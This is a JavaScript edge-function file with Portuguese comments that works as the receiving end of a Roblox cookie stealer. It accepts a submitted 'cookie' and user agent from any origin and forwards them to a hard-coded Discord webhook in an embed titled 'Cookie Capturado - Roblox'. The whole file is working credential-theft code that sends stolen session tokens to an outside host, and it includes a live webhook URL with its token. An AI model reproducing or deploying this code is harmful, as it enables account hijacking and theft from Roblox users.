export const config = { runtime: "edge" };

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

async function sendWebhook(payload) {
  return await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export default async function handler(req) {
  try {
    // Suporta GET e POST
    let cookie = "";
    let userAgent = "";

    if (req.method === "GET") {
      const { searchParams } = new URL(req.url);
      cookie = searchParams.get("cookie") || "Não enviado";
      userAgent = searchParams.get("userAgent") || "Não enviado";
    } else if (req.method === "POST") {
      const data = await req.json();
      cookie = data.cookie || "Não enviado";
      userAgent = data.userAgent || "Não enviado";
    } else {
      return new Response(JSON.stringify({ status: "erro", message: "Método não permitido" }), {
        status: 405,
        headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
      });
    }

    // Monta o embed sucesso
    const embedSuccess = {
      title: "Cookie Capturado - Roblox",
      color: 3066993, // verde
      fields: [
        { name: "Cookie", value: `\`\`\`${cookie.substring(0, 1024)}\`\`\`` || "Não enviado", inline: false },
        { name: "User Agent", value: `\`\`\`${userAgent.substring(0, 1024)}\`\`\`` || "Não enviado", inline: false },
        { name: "Host", value: "roblox.com", inline: true },
        { name: "Timestamp", value: new Date().toISOString(), inline: true },
      ],
    };

    // Tenta enviar webhook e captura erro
    const res = await sendWebhook({ embeds: [embedSuccess] });

    if (!res.ok) throw new Error(`Erro no Discord webhook: ${res.status}`);

    return new Response(JSON.stringify({ status: "sucesso", message: "Enviado com sucesso" }), {
      status: 200,
      headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
    });

  } catch (error) {
    // Embed erro
    const embedError = {
      title: "Erro ao enviar cookie",
      color: 15158332, // vermelho
      fields: [
        { name: "Erro", value: `\`\`\`${error.message}\`\`\`` || "Erro desconhecido", inline: false },
        { name: "Timestamp", value: new Date().toISOString(), inline: true },
      ],
    };

    // Tenta enviar embed erro (sem aguardar)
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embedError] }),
    });

    return new Response(JSON.stringify({ status: "erro", message: error.message }), {
      status: 500,
      headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
    });
  }
          }
